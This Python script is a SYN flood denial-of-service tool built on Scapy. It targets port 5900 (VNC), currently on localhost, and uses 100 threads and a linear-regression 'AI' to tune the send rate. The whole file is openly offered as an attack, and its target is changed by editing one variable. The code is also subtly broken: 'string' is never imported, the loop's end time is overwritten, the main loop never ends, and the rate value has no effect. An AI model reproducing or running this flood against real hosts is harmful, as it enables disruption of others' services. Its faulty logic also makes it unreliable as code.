from scapy.all import *
import threading
import time
import numpy as np
from sklearn.linear_model import LinearRegression

# Target details
target_ip = "127.0.0.1"  # Localhost
target_port = 5900  # VNC typically runs on port 5900

# Get the duration for the attack from the user
attack_duration = int(input("Enter the duration of the attack in minutes: ")) * 60  # Convert to seconds

# Training data for AI model
request_rates = []
response_times = []

# AI model for adjusting attack parameters
model = LinearRegression()

# Function to generate random data
def generate_random_data(size):
    return ''.join(np.random.choice(list(string.ascii_letters + string.digits), size))

# Function to perform the attack
def syn_flood(rate):
    end_time = time.time() + attack_duration
    while time.time() < end_time:
        try:
            start_time = time.time()
            # Create a SYN packet
            packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
            send(packet, verbose=False)
            end_time = time.time()
            response_time = end_time - start_time
            request_rates.append(rate)
            response_times.append(response_time)
            print(f"Sent SYN packet to {target_ip}:{target_port} with rate {rate}")  # Debug output
        except Exception as e:
            print(f"Unexpected error: {e}")

# Function to adjust attack rate based on AI model
def adjust_attack_rate():
    if len(request_rates) < 10:
        return 10  # Start with a default rate
    model.fit(np.array(request_rates).reshape(-1, 1), response_times)
    predicted_response_time = model.predict(np.array([max(request_rates)]).reshape(-1, 1))[0]
    if predicted_response_time < 1:  # If response time is low, increase rate
        return int(max(request_rates) * 1.5)
    else:
        return int(max(request_rates) * 0.5)  # If response time is high, decrease rate

# Number of threads to use in the attack
num_threads = 100

# Start the attack
threads = []
while True:
    rate = adjust_attack_rate()
    for i in range(num_threads):
        thread = threading.Thread(target=syn_flood, args=(rate,))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()
    
    print(f"Completed a round with rate: {rate}")

print("AI-Powered DoS attack completed.")
